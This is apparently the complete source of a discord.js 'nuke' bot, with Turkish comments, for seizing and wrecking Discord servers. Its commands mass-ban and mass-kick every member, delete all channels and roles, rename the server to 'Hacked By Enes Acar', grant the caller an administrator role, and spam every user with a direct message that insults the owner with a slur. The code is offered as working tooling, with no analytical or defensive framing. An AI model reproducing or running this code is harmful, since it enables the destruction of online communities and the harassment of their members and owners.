const Discord = require("discord.js");
const client = new Discord.Client();
const ayarlar = require("./ayarlar.json");
const { Client, Util } = require("discord.js");
const http = require("http");
const express = require("express");
const request = require("request");

const app = express();
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
}, 280000);

client.on("message", msg => {
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());
  }
});

client.on("message", msg => {
  if (msg.content === "+kick") {
    msg.delete();
    msg.guild.members.forEach(member => member.kick());
  }
});

client.on("message", async msg => {
  if (msg.content === "+çökert") {
    msg.delete();

    await msg.guild.channels.deleteAll();

    await msg.guild.createChannel("ャ tek-kral-enes-acar", {
      type: "text"
    });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ ENES ACAR", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ Hacked Server", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("ャ Kimse Yenemez", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });

    await msg.guild.setIcon(
      "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"
    );

    await msg.guild.setName("ャ Hacked By Enes Acar ャ"); //sunucu ismini yapar
    await client.user.setAvatar("https://i.hizliresim.com/7BR1Rm.jpg"); //botun pp sini yapar
    await client.user.setUsername("ャ Hacked By Enes Acar ャ"); //BOTUN ISMINI DEGISTIRIR HICBIRSEY ICIN BOS BIRAK
    await msg.guild.roles.forEach(roles => roles.delete()); //ALTINDAKI ROLLERI SILER
    await msg.guild.owner.send("Patladın Canım Geçmiş Olsun | https://discord.gg/vd77Jpf"); //KURUCUSUNA GONDERILEN MESAJ
    const kanal = await msg.guild.channels.find(x => x.name === "ャ tek-kral-enes-acar");
    await kanal.send("__**SİZ ACI ÇEKTİKÇE BİZ GÜLÜYORUZ**__ \nKÜLLERİMİZDEN TEKRAR DOĞACAĞIZ <a:kullermizdendogacagz:667722719290327041>");
  }
});
client.on("message", async msg => {
  if (msg.content === "+duyur") {
    msg.delete();
    await msg.client.users
      .forEach(users =>
        users.send(
          "`Patladı knk, Burdan` <@" +
            msg.guild.owner.id +
            "> `İsimli Orospuya Selamlar`\n || @everyone || https://discord.gg/xft7cnN "
        )
      )
      .catch(console.error);
  } //duyuru mesjai bu
});

//―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

client.on("message", msg => {
  if (msg.content === "+yetki") {
    msg.delete();
    msg.guild.createRole({
      name: "666",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === "666");
    msg.member.addRole(rol);
  }
});

client.on("message", msg => {
  if (msg.content === "+rol") {
    msg.guild.roles.forEach(roles => roles.delete());
  }
});

client.on("message", msg => {
  if (msg.content === "+rolspam") {
    msg.guild.roles.forEach(roles => roles.delete());
  }
});

client.on("message", msg => {
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());
  }
});
client.login(ayarlar.token);
